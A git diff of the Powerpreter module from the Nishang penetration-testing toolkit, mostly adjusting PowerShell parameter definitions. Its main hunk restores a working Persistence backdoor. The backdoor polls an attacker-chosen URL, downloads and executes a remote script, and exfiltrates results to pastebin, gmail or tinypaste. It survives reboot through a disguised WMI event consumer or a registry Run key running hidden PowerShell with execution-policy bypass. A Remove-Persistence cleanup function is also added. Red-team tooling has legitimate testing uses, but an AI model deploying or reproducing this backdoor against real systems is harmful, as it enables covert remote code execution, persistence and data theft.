@@ -1208,17 +1208,17 @@ http://code.google.com/p/nishang
 
     [CmdletBinding(DefaultParameterSetName="noexfil")]
     Param( [Parameter(Parametersetname="exfil")] [Switch] $exfil,
-    [Parameter(Position = 0, Parametersetname="exfil")] [Parameter(Position = 0, Mandatory = $True, Parametersetname="noexfil")] [String]$startdomain,
-    [Parameter(Position = 1, Parametersetname="exfil")] [Parameter(Position = 1, Mandatory = $True, Parametersetname="noexfil")] [String]$cmdstring,
-    [Parameter(Position = 2, Parametersetname="exfil")] [Parameter(Position = 2, Mandatory = $True, Parametersetname="noexfil")] [String]$commanddomain,
-    [Parameter(Position = 3, Parametersetname="exfil")] [Parameter(Position = 3, Mandatory = $True, Parametersetname="noexfil")] [String]$psstring,
-    [Parameter(Position = 4, Parametersetname="exfil")] [Parameter(Position = 4, Mandatory = $True, Parametersetname="noexfil")] [String]$psdomain,
-    [Parameter(Position = 5, Parametersetname="exfil")] [Parameter(Position = 5, Mandatory = $True, Parametersetname="noexfil")] [String]$StopString,
-    [Parameter(Position = 6, Parametersetname="exfil")] [Parameter(Position = 6, Mandatory = $True, Parametersetname="noexfil")] [String]$AuthNS,    
-    [Parameter(Position = 7,Mandatory = $True, Parametersetname="exfil")] [String]$dev_key,
-    [Parameter(Position = 8,Mandatory = $True, Parametersetname="exfil")] [String]$username,
-    [Parameter(Position = 9,Mandatory = $True, Parametersetname="exfil")] [String]$password,
-    [Parameter(Position = 10,Mandatory = $True, Parametersetname="exfil")] [String]$keyoutoption )
+    [Parameter(Position = 0, Mandatory = $True, Parametersetname="exfil")] [Parameter(Position = 0, Mandatory = $True, Parametersetname="noexfil")] [String]$startdomain,
+    [Parameter(Position = 1, Mandatory = $True, Parametersetname="exfil")] [Parameter(Position = 1, Mandatory = $True, Parametersetname="noexfil")] [String]$cmdstring,
+    [Parameter(Position = 2, Mandatory = $True, Parametersetname="exfil")] [Parameter(Position = 2, Mandatory = $True, Parametersetname="noexfil")] [String]$commanddomain,
+    [Parameter(Position = 3, Mandatory = $True, Parametersetname="exfil")] [Parameter(Position = 3, Mandatory = $True, Parametersetname="noexfil")] [String]$psstring,
+    [Parameter(Position = 4, Mandatory = $True, Parametersetname="exfil")] [Parameter(Position = 4, Mandatory = $True, Parametersetname="noexfil")] [String]$psdomain,
+    [Parameter(Position = 5, Mandatory = $True, Parametersetname="exfil")] [Parameter(Position = 5, Mandatory = $True, Parametersetname="noexfil")] [String]$StopString,
+    [Parameter(Position = 6, Mandatory = $True, Parametersetname="exfil")] [Parameter(Position = 6, Mandatory = $True, Parametersetname="noexfil")] [String]$AuthNS,    
+    [Parameter(Position = 7, Mandatory = $True, Parametersetname="exfil")] [String]$dev_key,
+    [Parameter(Position = 8, Mandatory = $True, Parametersetname="exfil")] [String]$username,
+    [Parameter(Position = 9, Mandatory = $True, Parametersetname="exfil")] [String]$password,
+    [Parameter(Position = 10, Mandatory = $True, Parametersetname="exfil")] [String]$keyoutoption )
 
     $modulepath = Split-Path $script:MyInvocation.MyCommand.Path
     $modulename = $script:MyInvocation.MyCommand.Name
@@ -2101,14 +2101,14 @@ http://code.google.com/p/nishang
 
     [CmdletBinding(DefaultParameterSetName="noexfil")]
     Param( [Parameter(Parametersetname="exfil")] [Switch] $exfil,
-    [Parameter(Position = 0, Parametersetname="exfil")] [Parameter(Position = 0, Mandatory = $True, Parametersetname="noexfil")] [String]$CheckURL,
-    [Parameter(Position = 1, Parametersetname="exfil")] [Parameter(Position = 1, Mandatory = $True, Parametersetname="noexfil")] [String]$PayloadURL,
-    [Parameter(Position = 2, Parametersetname="exfil")] [Parameter(Position = 2, Mandatory = $True, Parametersetname="noexfil")] [String]$MagicString,
-    [Parameter(Position = 3, Parametersetname="exfil")] [Parameter(Position = 3, Mandatory = $True, Parametersetname="noexfil")] [String]$StopString,
-    [Parameter(Position = 4,Mandatory = $True, Parametersetname="exfil")] [String]$dev_key,
-    [Parameter(Position = 5,Mandatory = $True, Parametersetname="exfil")] [String]$username,
-    [Parameter(Position = 6,Mandatory = $True, Parametersetname="exfil")] [String]$password,
-    [Parameter(Position = 7,Mandatory = $True, Parametersetname="exfil")] [String]$keyoutoption )
+    [Parameter(Position = 0, Mandatory = $True, Parametersetname="exfil")] [Parameter(Position = 0, Mandatory = $True, Parametersetname="noexfil")] [String]$CheckURL,
+    [Parameter(Position = 1, Mandatory = $True, Parametersetname="exfil")] [Parameter(Position = 1, Mandatory = $True, Parametersetname="noexfil")] [String]$PayloadURL,
+    [Parameter(Position = 2, Mandatory = $True, Parametersetname="exfil")] [Parameter(Position = 2, Mandatory = $True, Parametersetname="noexfil")] [String]$MagicString,
+    [Parameter(Position = 3, Mandatory = $True, Parametersetname="exfil")] [Parameter(Position = 3, Mandatory = $True, Parametersetname="noexfil")] [String]$StopString,
+    [Parameter(Position = 4, Mandatory = $True, Parametersetname="exfil")] [String]$dev_key,
+    [Parameter(Position = 5, Mandatory = $True, Parametersetname="exfil")] [String]$username,
+    [Parameter(Position = 6, Mandatory = $True, Parametersetname="exfil")] [String]$password,
+    [Parameter(Position = 7, Mandatory = $True, Parametersetname="exfil")] [String]$keyoutoption )
 
     $modulepath = Split-Path $script:MyInvocation.MyCommand.Path
     $modulename = $script:MyInvocation.MyCommand.Name
@@ -2228,12 +2228,12 @@ http://code.google.com/p/nishang
 
     [CmdletBinding(DefaultParameterSetName="noexfil")]
     Param( [Parameter(Parametersetname="exfil")] [Switch] $exfil,
-    [Parameter(Position = 0, Parametersetname="exfil")] [Parameter(Position = 0, Mandatory = $True, Parametersetname="noexfil")] [String]$CheckURL,
-    [Parameter(Position = 1, Parametersetname="exfil")] [Parameter(Position = 1, Mandatory = $True, Parametersetname="noexfil")] [String]$StopString,
-    [Parameter(Position = 2,Mandatory = $True, Parametersetname="exfil")] [String]$dev_key,
-    [Parameter(Position = 3,Mandatory = $True, Parametersetname="exfil")] [String]$username,
-    [Parameter(Position = 4,Mandatory = $True, Parametersetname="exfil")] [String]$password,
-    [Parameter(Position = 5,Mandatory = $True, Parametersetname="exfil")] [String]$keyoutoption )
+    [Parameter(Position = 0, Mandatory = $True, Parametersetname="exfil")] [Parameter(Position = 0, Mandatory = $True, Parametersetname="noexfil")] [String]$CheckURL,
+    [Parameter(Position = 1, Mandatory = $True, Parametersetname="exfil")] [Parameter(Position = 1, Mandatory = $True, Parametersetname="noexfil")] [String]$StopString,
+    [Parameter(Position = 2, Mandatory = $True, Parametersetname="exfil")] [String]$dev_key,
+    [Parameter(Position = 3, Mandatory = $True, Parametersetname="exfil")] [String]$username,
+    [Parameter(Position = 4, Mandatory = $True, Parametersetname="exfil")] [String]$password,
+    [Parameter(Position = 5, Mandatory = $True, Parametersetname="exfil")] [String]$keyoutoption )
 
     $modulepath = Split-Path $script:MyInvocation.MyCommand.Path
     $modulename = $script:MyInvocation.MyCommand.Name
@@ -2964,28 +2964,89 @@ Code by @al14s
 
 
 
-<# Looks like I broke the Persistence module while trying to improve it. This should be fixed soon.
-
-
-#################################Achieve persistence using WMI permanent event consumer################################################
+########################################################Achieve persistence ###############################################
 ###http://blogs.technet.com/b/heyscriptingguy/archive/2012/07/20/use-powershell-to-create-a-permanent-wmi-event-to-launch-a-vbscript.aspx
 
-function Persistence_WMI
+function Persistence
 {
+<#
+.SYNOPSIS
+Function which could be used to add reboot persistence to powerpreter.
+
+.DESCRIPTION
+Powerpretert is dropped into the user's temp directory (with name Update.psm1) and either WMI permanent event consumer or Registry changes is used (based on privs) for persistence.
+The Update.psm1 is then copied to $PSModulepath of the user.
+Persistence created using this function could be cleaned by using the Remove-Persistence fucntion.
+
+.PARAMETER CheckURL
+The URL which the payload would query for instructions.
+
+.PARAMETER PayloadURL
+The URL from where the powershell script would be downloaded.
+
+.PARAMETER MagicString
+The string which would act as an instruction to the payload to proceed with download and execute.
+
+.PARAMETER StopString
+The string which if found at CheckURL will stop the payload.
+
+.PARAMETER persist
+Use this parameter to achieve reboot persistence. Different methods of persistence with Admin access and normal user access.
+
+.PARAMETER exfil
+Use this parameter to use exfiltration methods for returning the results.
+
+.PARAMETER dev_key
+The Unique API key provided by pastebin when you register a free account.
+Unused for tinypaste.
+Unused for gmail option.
+
+.PARAMETER username
+Username for the pastebin account where data would be pasted.
+Username for the tinypaste account where data would be pasted.
+Username for the gmail account where attachment would be sent as an attachment.
+
+.PARAMETER password
+Password for the pastebin account where data would be pasted.
+Password for the tinypaste account where data would be pasted.
+Password for the gmail account where data would be sent.
+
+.PARAMETER keyoutoption
+The method you want to use for exfitration of data.
+"0" for displaying on console
+"1" for pastebin.
+"2" for gmail
+"3" for tinypaste   
+
+.Example
+PS > Persistence
+The payload will ask for all required options.
+
+.Example
+PS > Persistence -exfil
+Use above command for using exfiltration methods.
+
+
+.LINK
+http://labofapenetrationtester.blogspot.com/
+http://code.google.com/p/nishang
+http://blogs.technet.com/b/heyscriptingguy/archive/2012/07/20/use-powershell-to-create-a-permanent-wmi-event-to-launch-a-vbscript.aspx
+#>
 
     
     [CmdletBinding(DefaultParameterSetName="noexfil")]
-    Param( [Parameter(Position = 0)] [String] $PowerpreterURL,
-    [Parameter(Parametersetname="exfil")] [Switch] $exfil,
-    [Parameter(Position = 1, Parametersetname="exfil")] [Parameter(Position = 0, Mandatory = $True, Parametersetname="noexfil")] [String]$CheckURL,
-    [Parameter(Position = 2, Parametersetname="exfil")] [Parameter(Position = 1, Mandatory = $True, Parametersetname="noexfil")] [String]$PayloadURL,
-    [Parameter(Position = 3, Parametersetname="exfil")] [Parameter(Position = 2, Mandatory = $True, Parametersetname="noexfil")] [String]$MagicString,
-    [Parameter(Position = 4, Parametersetname="exfil")] [Parameter(Position = 3, Mandatory = $True, Parametersetname="noexfil")] [String]$StopString,
-    [Parameter(Position = 5,Mandatory = $True, Parametersetname="exfil")] [String]$dev_key,
-    [Parameter(Position = 6,Mandatory = $True, Parametersetname="exfil")] [String]$username,
-    [Parameter(Position = 7,Mandatory = $True, Parametersetname="exfil")] [String]$password,
-    [Parameter(Position = 8,Mandatory = $True, Parametersetname="exfil")] [String]$keyoutoption )
-    $backdoorcode = @" 
+    Param([Parameter(Parametersetname="exfil")] [Switch] $exfil,
+    [Parameter(Position = 0, Mandatory = $True, Parametersetname="exfil")] [Parameter(Position = 0, Mandatory = $True, Parametersetname="noexfil")] [String]$CheckURL,
+    [Parameter(Position = 1, Mandatory = $True, Parametersetname="exfil")] [Parameter(Position = 1, Mandatory = $True, Parametersetname="noexfil")] [String]$PayloadURL,
+    [Parameter(Position = 2, Mandatory = $True, Parametersetname="exfil")] [Parameter(Position = 2, Mandatory = $True, Parametersetname="noexfil")] [String]$MagicString,
+    [Parameter(Position = 3, Mandatory = $True, Parametersetname="exfil")] [Parameter(Position = 3, Mandatory = $True, Parametersetname="noexfil")] [String]$StopString,
+    [Parameter(Position = 4, Mandatory = $True, Parametersetname="exfil")] [String]$dev_key,
+    [Parameter(Position = 5, Mandatory = $True, Parametersetname="exfil")] [String]$username,
+    [Parameter(Position = 6, Mandatory = $True, Parametersetname="exfil")] [String]$password,
+    [Parameter(Position = 7, Mandatory = $True, Parametersetname="exfil")] [String]$keyoutoption )
+    $backdoorcode = @' 
+function Persistence_HTTP ($CheckURL, $PayloadURL, $MagicString, $StopString, $dev_key, $username, $password, $keyoutoption, $exfil) 
+{
     while($true)
     {
     $exec = 0
@@ -2995,13 +3056,14 @@ function Persistence_WMI
     if($filecontent -eq $MagicString)
     {
         $webclient = New-Object System.Net.WebClient
-        $command = $webclient.DownloadString("$PayloadURL")
-        Invoke-Expression $command
+        $file1 = "$env:temp\payload.ps1"
+        $webclient.DownloadFile($PayloadURL,"$file1")
+        $pastevalue = Invoke-Expression $file1
         $exec++
         if ($exfil -eq $True)
         {
-            $pastename = $env:COMPUTERNAME + "Output of Persistence: "
-            Do-Exfiltration "$pastename" "$pastevalue" "$username" "$password" "$dev_key" "$keyoutoption"
+           $pastename = $env:COMPUTERNAME + " Results of Persistence: "
+           Do-Exfiltration "$pastename" "$pastevalue" "$username" "$password" "$dev_key" "$keyoutoption"
         }
         if ($exec -eq 1)
         {
@@ -3013,83 +3075,120 @@ function Persistence_WMI
         break
     }
     }
-"@
+}
+'@
 
 
     $currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent()) 
     if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -eq $true)
     {
-        #$computer = "" | TODO
         $filterNS = "root\cimv2"
         $wmiNS = "root\subscription"
         $query = @"
          Select * from __InstanceCreationEvent within 3 
          where targetInstance isa 'Win32_LogonSession' 
 "@
-
         $filterName = "WindowsSanity"
-        $scriptFileName = "$env:temp\persist.vbs"
-
+        $scriptpath = $env:TEMP
+        $scriptFileName = "$scriptpath\$name"
         $filterPath = Set-WmiInstance -Class __EventFilter -Namespace $wmiNS -Arguments @{name=$filterName; EventNameSpace=$filterNS; QueryLanguage="WQL"; Query=$query}
-
-
         $consumerPath = Set-WmiInstance -Class ActiveScriptEventConsumer -Namespace $wmiNS -Arguments @{name="WindowsSanity"; ScriptFileName=$scriptFileName; ScriptingEngine="VBScript"}
-
         Set-WmiInstance -Class __FilterToConsumerBinding -Namespace $wmiNS -arguments @{Filter=$filterPath; Consumer=$consumerPath} |  out-null
-
         echo "Set objShell = CreateObject(`"Wscript.shell`")" > "$env:temp\persist.vbs"
         echo "objShell.run(`"powershell -WindowStyle Hidden -executionpolicy bypass -file $env:temp\persist.ps1`")" >> "$env:temp\persist.vbs"
-
-        if($URL)
+        $powerpreterpath =  $MyInvocation.MyCommand.Module.Path
+        Copy-Item $powerpreterpath -Destination $env:TEMP\Update.psm1
+        $options = "Persistence_HTTP  $CheckURL $PayloadURL $MagicString $StopString"
+        if ($exfil -eq $True)
         {
-            $webclient = New-Object System.Net.WebClient
-            $file = "$env:temp\Update.psm1"
-            $webclient.DownloadFile($URL,"$file")
-            echo "mkdir `"$env:USERPROFILE\WindowsPowerShell\Modules\UpdateModules\Update(x64)`", `"$env:USERPROFILE\WindowsPowerShell\Modules\UpdateModules\Update`", `"$env:USERPROFILE\WindowsPowerShell\Modules\UpdateModules\UpdateCheck`"" > "$env:temp\persist.ps1"
-            echo "`$currentpath = `"$env:temp\Update.psm1`"" >> "$env:temp\persist.ps1"
-            echo "Copy-Item `$currentpath -Destination `"$env:USERPROFILE\WindowsPowerShell\Modules\UpdateModules\Update`"" >> "$env:temp\persist.ps1"
-            echo $backdoorcode >> "$env:temp\persist.ps1"
+            $options = "Persistence_HTTP $CheckURL $PayloadURL $MagicString $StopString $dev_key $username $password $keyoutoption $exfil"
         }
-        else
-        {
-            echo "mkdir `"$env:USERPROFILE\WindowsPowerShell\Modules\UpdateModules\Update(x64)`", `"$env:USERPROFILE\WindowsPowerShell\Modules\UpdateModules\Update`", `"$env:USERPROFILE\WindowsPowerShell\Modules\UpdateModules\UpdateCheck`"" > "$env:temp\persist.ps1"
-            echo "`$currentpath = `"$env:temp\Update.psm1`"" >> "$env:temp\persist.ps1"
-            echo "Copy-Item `$currentpath -Destination `"$env:USERPROFILE\WindowsPowerShell\Modules\UpdateModules\Update`"" >> "$env:temp\persist.ps1"
-            echo $backdoorcode >> "$env:temp\persist.ps1"
-        }
-        }
+        echo "mkdir `"$env:USERPROFILE\WindowsPowerShell\Documents\Modules\UpdateModules\Update(x64)`", `"$env:USERPROFILE\WindowsPowerShell\Documents\Modules\UpdateModules\Update`", `"$env:USERPROFILE\WindowsPowerShell\Documents\Modules\UpdateModules\UpdateCheck`"" > "$env:temp\persist.ps1"
+        echo "`$currentpath = `"$env:temp\Update.psm1`"" >> "$env:temp\persist.ps1"
+        echo "Copy-Item `$currentpath -Destination `"$env:USERPROFILE\WindowsPowerShell\Documents\Modules\UpdateModules\Update`"" >> "$env:temp\persist.ps1"
+        Out-File -InputObject $backdoorcode -Append "$env:TEMP\persist.ps1"
+        Out-File -InputObject $options -Append "$env:TEMP\persist.ps1"
+    }
     else
     {
-        
-        New-ItemProperty -Path HKCU:Software\Microsoft\Windows\CurrentVersion\RunOnce\ -Name Update -PropertyType String -Value "$($env:temp)\persist.vbs" -force
-    
-        if($URL)
+        New-ItemProperty -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Update -PropertyType String -Value "$($env:temp)\persist.vbs" -force
+        $powerpreterpath =  $MyInvocation.MyCommand.Module.Path
+        Copy-Item -path $powerpreterpath -Destination $env:TEMP\Update.psm1
+        $options = "Persistence_HTTP  $CheckURL $PayloadURL $MagicString $StopString"
+        if ($exfil -eq $True)
         {
-            $webclient = New-Object System.Net.WebClient
-            $file = "$env:temp\Update.psm1"
-            $webclient.DownloadFile($URL,"$file")
-            echo "mkdir `"$env:USERPROFILE\WindowsPowerShell\Modules\UpdateModules\Update(x64)`", `"$env:USERPROFILE\WindowsPowerShell\Modules\UpdateModules\Update`", `"$env:USERPROFILE\WindowsPowerShell\Modules\UpdateModules\UpdateCheck`"" > "$env:temp\persist.ps1"
-            echo "`$currentpath = `"$env:temp\Update.psm1`"" >> "$env:temp\persist.ps1"
-            echo "Copy-Item `$currentpath -Destination `"$env:USERPROFILE\WindowsPowerShell\Modules\UpdateModules\Update`"" >> "$env:temp\persist.ps1"
-            echo $backdoorcode >> "$env:temp\persist.ps1"
+            $options = "Persistence_HTTP $CheckURL $PayloadURL $MagicString $StopString $dev_key $username $password $keyoutoption $exfil"
         }
-        else
-        {
-            
-            echo "mkdir `"$env:USERPROFILE\WindowsPowerShell\Modules\UpdateModules\Update(x64)`", `"$env:USERPROFILE\WindowsPowerShell\Modules\UpdateModules\Update`", `"$env:USERPROFILE\WindowsPowerShell\Modules\UpdateModules\UpdateCheck`"" > "$env:temp\persist.ps1"
-            echo "`$currentpath = `"$env:temp\Update.psm1`"" >> "$env:temp\persist.ps1"
-            echo "Copy-Item `$currentpath -Destination `"$env:USERPROFILE\WindowsPowerShell\Modules\UpdateModules\Update`"" >> "$env:temp\persist.ps1"
-            echo $backdoorcode >> "$env:temp\persist.ps1"
-        }
+        echo "mkdir `"$env:USERPROFILE\WindowsPowerShell\Documents\Modules\UpdateModules\Update(x64)`", `"$env:USERPROFILE\WindowsPowerShell\Documents\Modules\UpdateModules\Update`", `"$env:USERPROFILE\WindowsPowerShell\Documents\Modules\UpdateModules\UpdateCheck`"" > "$env:temp\persist.ps1"
+        echo "`$currentpath = `"$env:temp\Update.psm1`"" >> "$env:temp\persist.ps1"
+        echo "Copy-Item `$currentpath -Destination `"$env:USERPROFILE\WindowsPowerShell\Documents\Modules\UpdateModules\Update`"" >> "$env:temp\persist.ps1"
+        Out-File -InputObject $backdoorcode -Append "$env:TEMP\persist.ps1"
+        Out-File -InputObject $options -Append "$env:TEMP\persist.ps1"
         echo "Set objShell = CreateObject(`"Wscript.shell`")" > "$env:temp\persist.vbs"
         echo "objShell.run(`"powershell -WindowStyle Hidden -executionpolicy bypass -file $env:temp\persist.ps1`")" >> "$env:temp\persist.vbs"
-    }
-    
-    
+    } 
 }
-#>
 
-##########################################Pivoting to other systems#################################################################
+
+########################################################## Clear Persistence ##############################################################
+function Remove-Persistence
+{
+ <#
+.SYNOPSIS
+Function which could be used to clear the persistence added by backdoors and keylogger.
+
+.DESCRIPTION
+This function cleans WMI events and Registry keys added by various payloads and Add-persistence script of Nishang.
+Run the function as an Administrator to remove the WMI events.
+
+.Example
+PS > Remove-Persistence
+
+.LINK
+http://labofapenetrationtester.blogspot.com/
+http://code.google.com/p/nishang
+http://blogs.technet.com/b/heyscriptingguy/archive/2012/07/20/use-powershell-to-create-a-permanent-wmi-event-to-launch-a-vbscript.aspx
+#>
+    Param( [Parameter(Position = 0)] [Switch] $remove)
+
+    if ($remove -eq $true)
+    {
+        $currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent())
+        if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -ne $true)
+        {    
+            Write-Warning "Run the Command as an Administrator. Removing Registry keys only."
+            Remove-ItemProperty -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Update -ErrorAction SilentlyContinue
+            Break
+        }
+
+        Write-Output "Removing the WMI Events."
+        $filterName = "WindowsSanity"
+        gwmi __eventFilter -namespace root\subscription -filter "name='WindowsSanity'"| Remove-WmiObject
+        gwmi activeScriptEventConsumer -Namespace root\subscription | Remove-WmiObject
+        gwmi __filtertoconsumerbinding -Namespace root\subscription -Filter "Filter = ""__eventfilter.name='WindowsSanity'"""  | Remove-WmiObject
+        Write-Output "Removing the Registry keys."
+        Remove-ItemProperty -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Update -ErrorAction SilentlyContinue
+    }
+    $Regkey = Get-ItemProperty -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -name Update -ErrorAction SilentlyContinue
+    $wmi_1 = gwmi __eventFilter -namespace root\subscription -filter "name='WindowsSanity'"
+    $wmi_2 = gwmi activeScriptEventConsumer -Namespace root\subscription
+    $wmi_3 = gwmi __filtertoconsumerbinding -Namespace root\subscription -Filter "Filter = ""__eventfilter.name='WindowsSanity'"""
+    if ($Regkey -ne $null )
+    {
+        Write-Warning "Run Registry key persistence found. Use with -Remove option to clean."
+    }
+    elseif (($wmi_1) -and ($wmi_2) -and ($wmi_3) -ne $null)    
+    {
+        Write-Warning "WMI permanent event consumer persistence found. Use with -Remove option to clean."
+    }
+    else
+    {
+        Write-Output "No Persistence found."
+    }
+}
+
+
+#########################################################Pivoting to other systems##########################################################
 function Pivot
 {
 
